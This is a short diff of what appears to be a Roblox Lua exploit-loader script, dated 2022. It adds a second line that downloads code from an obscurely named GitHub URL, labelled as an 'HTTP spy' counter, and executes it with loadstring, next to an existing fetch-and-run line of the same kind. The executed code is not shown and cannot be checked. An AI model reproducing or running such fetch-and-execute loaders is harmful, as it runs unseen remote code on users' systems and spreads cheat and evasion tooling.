@@ -1,3 +1,5 @@
 print("Second Loop")
 --Updated By Lenix on 11 | 20 | 2022 .
 loadstring(game:HttpGet("https://raw.githubusercontent.com/01010101010x/010100101/main/LoopProtect"))();
+wait(0.1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/01010101010x/010100101/main/ISEEYOUSKIDWITHUR_HTTP_SPY"))();
